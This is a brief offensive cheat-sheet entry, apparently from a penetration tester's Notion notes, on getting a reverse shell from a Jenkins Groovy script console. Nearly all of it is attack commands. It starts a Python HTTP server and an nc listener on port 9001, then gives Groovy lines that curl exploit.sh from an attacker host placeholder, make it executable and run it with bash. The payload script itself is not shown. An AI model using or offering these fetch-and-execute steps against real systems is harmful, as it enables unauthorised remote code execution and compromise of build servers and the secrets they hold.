# Jenkins Groovy Script

OS: Linux
Description: Pop a reverse shell (RFI) Jenkins/Groovy Script
Security Domains: Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), Groovy Script (https://www.notion.so/Groovy-Script-2f34c8e523768081a0d9fc037c98b700?pvs=21)

ATTACK MACHINE:

```jsx
python3 -m http.server
```

### Attack Machine. (Second Terminal)

```jsx
nc -lvnp 9001 
```

### Jenkins Groovy Script

```jsx
println "curl http://IP_OF_KALI:8000/exploit.sh -o /tmp/exploit.sh".execute().text
println "chmod 777 /tmp/exploit.sh".execute().text
println "/bin/bash /tmp/exploit.sh".execute().text
```